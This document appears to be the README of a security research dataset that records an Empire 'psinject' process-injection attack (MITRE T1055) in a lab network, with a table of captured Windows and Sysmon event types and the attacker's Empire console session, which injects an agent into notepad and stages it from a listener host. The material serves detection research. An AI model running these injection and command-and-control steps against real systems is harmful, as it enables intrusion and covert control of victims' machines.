# Empire Psinject

Adversaries can reflectively load a DLL to enable additional functionalities to any process in the endpoint. An adversary can use Empire psinject to inject Unmanaged PowerShell into any process. This project is a reflective DLL based on Stephen Fewer's method. It imports/runs a .NET assembly into its memory space that supports the running of Powershell code using System.Management.Automation.

## Technique(s) ID

T1055

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_psinject.tar.gz](./empire_psinject.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18200432

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |            1739 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |              16 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               2 |
| System                                     | Microsoft-Windows-GroupPolicy       | na                                                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             474 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             167 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |             127 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              50 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              16 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              16 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |              15 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              13 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |              11 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | SAM                                                    |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security Group Management                              |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            1442 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             538 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             408 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             257 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | CreateRemoteThread detected (rule: CreateRemoteThread) |              88 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              67 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              44 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              38 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |              13 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |              11 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |              10 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |            1711 |

## Attacker Activity

```
(Empire: TKV35P8X) > usemodule management/psinject 
(Empire: powershell/management/psinject) > set ProcName notepad
(Empire: powershell/management/psinject) > info   

              Name: Invoke-PSInject
            Module: powershell/management/psinject
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @harmj0y
  @sixdub
  leechristensen (@tifkin_)

Description:
  Utilizes Powershell to to inject a Stephen Fewer formed
  ReflectivePick which executes PS codefrom memory in a remote
  process

Comments:
  http://sixdub.net

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProcId     False                                 ProcessID to inject into.               
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      
  Agent      True        TKV35P8X                  Agent to run module on.                 
  Listener   True        https                     Listener to use.                        
  ProcName   False       notepad                   Process name to inject into.            
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      

(Empire: powershell/management/psinject) > execute
[*] Tasked TKV35P8X to run TASK_CMD_JOB
[*] Agent TKV35P8X tasked with task ID 13
[*] Tasked agent TKV35P8X to run module powershell/management/psinject
(Empire: powershell/management/psinject) > Job started: BELAKR
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent EMDBFPSY checked in
[+] Initial agent EMDBFPSY from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to EMDBFPSY at 10.0.10.103

(Empire: powershell/management/psinject) > agents 

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 20:06:25  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 20:06:28  https           
 56W8UEHP ps 172.18.39.106   HR001             SHIRE\nmartha           cmd                8572   5/0.0    2019-05-18 20:03:49  https           

 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 20:06:28  https   
```